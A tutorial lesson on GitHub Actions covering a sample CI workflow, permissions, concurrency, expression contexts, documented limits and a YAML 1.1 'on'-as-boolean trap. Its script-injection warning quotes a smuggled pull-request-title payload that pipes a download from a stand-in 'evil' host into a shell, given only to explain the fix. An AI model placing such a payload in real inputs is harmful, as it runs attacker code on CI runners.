---
description: "GitHub Actions essentials: workflows, events, jobs, steps, contexts and permissions, with a sample workflow parsed and the YAML 1.1 trap shown."
---

# 03 · GitHub Actions Essentials

GitHub Actions is the CI/CD system built into GitHub: pipelines are YAML files in `.github/workflows/`, triggered by repository events, run on GitHub-hosted or self-hosted runners. This lesson covers the parts you need to read and write real workflows; the full feature tour (Marketplace, packages, Pages, issue automation) belongs to the [GitHub & Git Mastery Path](https://sigilipelli.github.io/github-mastery-path/), which this course does
not duplicate.

!!! note "What was run"
    **No workflow below was run on GitHub**; there was no repository or runner in this environment. The syntax comes from the GitHub Actions documentation (docs.github.com, October 2026), and the numeric limits I quote come from its "Actions limits" page. What I did run: PyYAML parsed the example workflow (it is well-formed YAML), which surfaced the YAML 1.1 gotcha described below; I did *not* validate it against GitHub's schema (a tool such as `actionlint` would, but
    I did not run one). Action version tags (`@v4`, `@v5`) are as I knew them and change over time; check the current major versions. See Lesson 01.

## A complete workflow

```yaml
name: ci
on:
  push:
    branches: [main]
  pull_request:
  workflow_dispatch:

permissions:
  contents: read

concurrency:
  group: ci-${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true

jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    strategy:
      fail-fast: false
      matrix:
        python: ["3.11", "3.12"]
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: ${{ matrix.python }}
          cache: pip
      - run: pip install -r requirements.txt
      - run: python -m pytest -q
  package:
    needs: test
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@v4
      - run: tar -czf app.tar.gz app
      - uses: actions/upload-artifact@v4
        with:
          name: app
          path: app.tar.gz
```

Reading it top to bottom:

- **`on:`** lists triggers: pushes to `main`, any pull request, and manual runs (`workflow_dispatch`). Other events include `schedule`, `release`, `workflow_call` (reusable workflows; Level 2 · 03) and many repository events.
- **`permissions: contents: read`** restricts the automatic `GITHUB_TOKEN` to read-only access to repository contents. **Set this explicitly.** Without it the token's default permissions depend on repository/organization settings and may be broader than you want; least privilege is the rule (Level 4 · 01).
- **`concurrency`** puts runs of the same workflow and ref in one group; `cancel-in-progress: true` cancels the older run when a newer push arrives, saving runner minutes on rapid pushes. Do **not** cancel in-progress deployments this way.
- **`jobs.test`** runs on a GitHub-hosted `ubuntu-latest` runner with a **`timeout-minutes: 15`**. The default job limit on GitHub-hosted runners is 6 hours (documented), so always set something smaller. `strategy.matrix` creates one job per Python version, and `fail-fast: false` lets the other versions finish when one fails (the default is `true`, cancelling the rest; Level 2 · 01).
- **`steps`**: `uses:` runs a reusable *action* (`actions/checkout` fetches the code, `actions/setup-python` installs Python and, with `cache: pip`, caches dependencies); `run:` runs a shell command. Each step's exit code decides pass/fail.
- **`needs: test`** orders `package` after all matrix jobs of `test`; **`if: github.ref == 'refs/heads/main'`** limits packaging to the main branch.
- **`actions/upload-artifact`** stores `app.tar.gz` so it can be downloaded or used by a later job or workflow (Lesson 07).

## Contexts and expressions

`${{ ... }}` evaluates expressions against **contexts**: `github` (event, ref, sha, actor), `env`, `secrets`, `vars`, `matrix`, `needs` (outputs from earlier jobs), `runner`, `job`, `steps`. Examples: `${{ github.sha }}`, `${{ secrets.DEPLOY_TOKEN }}`, `${{ needs.build.outputs.version }}`. Functions include `contains()`, `startsWith()`, `hashFiles()` (used for cache keys; Lesson 06), and status checks
`success()`, `failure()`, `always()`, `cancelled()`.

**Injection warning**: never put untrusted event data (a pull request title, branch name, issue body) directly into a `run:` script via `${{ }}`; the expression is substituted *before* the shell sees it, so a title like `"; curl evil | sh` becomes part of the script. Pass it through an environment variable and reference the variable instead (`env: TITLE: ${{ github.event.pull_request.title }}`, then `"$TITLE"`). Level 2 · 10 builds a linter that flags this.

## Documented limits worth knowing (GitHub "Actions limits" page, October 2026)

| Limit | Value |
|---|---|
| Job execution time, GitHub-hosted runners | 6 hours (the job is terminated) |
| Job execution time, self-hosted runners | 5 days |
| Jobs generated by one matrix | 256 per workflow run |
| Workflow run time (including waiting and approvals) | 35 days |
| Time a run can wait for an environment approval | 30 days |
| Re-runs of one workflow run | 50 |
| Cache storage per repository | 10 GB |
| Concurrent jobs (standard hosted runners) | Depends on plan: 20 (Free), 40 (Pro), 60 (Team), 500 (Enterprise) |

These change; check the page before designing around them. Artifact and minute allowances also vary by plan.

## The YAML 1.1 gotcha, found by parsing

When I parsed the workflow with PyYAML to check it, the top-level keys came back as:

```text
['name', True, 'permissions', 'concurrency', 'jobs']
```

The key `on` became the boolean **`True`**. YAML 1.1 treats the bare words `on`, `off`, `yes` and `no` as booleans (`yaml.safe_load("a: on\nb: yes\nc: no\nd: 'on'")` gave `{'a': True, 'b': True, 'c': False, 'd': 'on'}`; only the quoted `'on'` stayed a string). GitHub's own parser handles `on` correctly, so your workflow is fine, but any script that reads workflow files with a YAML 1.1 library must look for `True` as well as `"on"`
(the linter in Level 2 · 10 does). The same trap bites version strings: `python: [3.10]` is the float `3.1`, which is why the example quotes `"3.11"` and `"3.12"`; and country code `NO` becomes `False`. Quote strings that could be misread.

## Running the same job locally

A workflow's real work should be a command you can run on your laptop (`make test`, `./ci.sh`, `python -m pytest`), with the workflow only wiring triggers, caching and credentials around it. Then a failing pipeline is reproducible, and moving between CI systems (Level 4 · 08) is cheap. Tools like `act` try to run workflows locally in containers; I did not use it, and it does not match GitHub's runners exactly.

## How It Actually Works

When an event matches a workflow's `on:` filter, GitHub creates a **run**, evaluates job dependencies and conditions, and queues each ready job for a runner with the requested label (`ubuntu-latest` selects a GitHub-hosted VM image; self-hosted labels select your machines). The runner downloads the job's steps, creates a fresh workspace, and for each `uses:` step fetches the referenced action at its tag/SHA and executes it (JavaScript, Docker or composite),
for each `run:` step spawns the shell. The runner streams logs back, evaluates `if:` and exit codes, and uploads artifacts and caches to GitHub's storage. The `GITHUB_TOKEN` is a short-lived credential minted per run with the permissions you declared. Because each job gets a clean VM, nothing persists between jobs except artifacts, caches and outputs.

## Common mistakes

- **No `permissions:` block**, leaving broader token rights than needed.
- **No `timeout-minutes`**, so a hang burns up to 6 hours.
- **Unquoted version numbers and booleans in YAML.**
- **Untrusted event fields inside `run:` expressions** (script injection).
- **`cancel-in-progress` on deploy jobs.**
- **Third-party actions pinned to a mutable tag** (Level 3 · 08).
- **Putting all logic in workflow YAML** instead of scripts that run locally.
- **Using `pull_request_target` carelessly** (it runs with secrets in the base repository's context; treat checkout of fork code there as dangerous).

## Exercise

1. Write a workflow for a project you know that runs tests on push and pull request, with `permissions`, `timeout-minutes` and `concurrency`. Parse it with PyYAML to confirm it is valid YAML, and note the `True` key.
2. Add a manual-dispatch input (`workflow_dispatch.inputs`) that selects a target environment, and use it in an `if:` expression.
3. Rewrite a step that interpolates a pull request title into a shell command so it uses an environment variable instead.
4. Read the "Actions limits" page and compute how many matrix combinations you could create for three operating systems and five language versions with two extra flags (and whether it fits the 256-job limit).
